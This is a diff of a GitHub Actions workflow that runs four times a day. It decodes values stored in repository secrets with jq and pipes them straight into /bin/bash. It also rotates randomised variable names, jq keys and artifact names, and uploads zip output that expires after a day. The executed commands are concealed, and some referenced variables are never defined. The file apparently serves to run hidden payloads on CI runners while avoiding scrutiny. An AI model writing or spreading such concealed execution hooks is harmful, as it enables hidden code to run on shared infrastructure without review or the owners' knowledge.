@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '18 3,9,15,21 * * *'
+    - cron: '31 2,8,14,20 * * *'
 jobs:
   handler:
     runs-on: ubuntu-latest
@@ -12,20 +12,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: Launch
         env:
-          orfuj3333: ${{ secrets.orfuj3333 }}
+          ac3056: ${{ secrets.ac3056 }}
         run: |
-          printf '%s' "$orfuj3333" | jq -r .qx328 | /bin/bash
-          printf '%s' "$mvza8" | jq -r .anj52233 | /bin/bash
-          printf '%s' "$k195" | jq -r .m68 | /bin/bash
-          printf '%s' "$dwc57467" | jq -r .bdwf80 | /bin/bash
-          echo $sjudf56779 | jq -r .lw980 | /bin/bash
-          printf '%s' "$pgvlb70702" | jq -r .bi16981 | /bin/bash
-          echo $nyve2048 | jq -r .lsrk284 | /bin/bash
+          printf '%s' "$ac3056" | jq -r .xyulo10 | /bin/bash
+          printf '%s' "$hg46206" | jq -r .r9089 | /bin/bash
+          printf '%s' "$bfx01" | jq -r .evtep92441 | /bin/bash
+          printf '%s' "$uiao7685" | jq -r .c7 | /bin/bash
 
       - name: Persist output
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: KhWnfi4I
+          name: JlzzQJok
           path: "*.zip"
           retention-days: 1
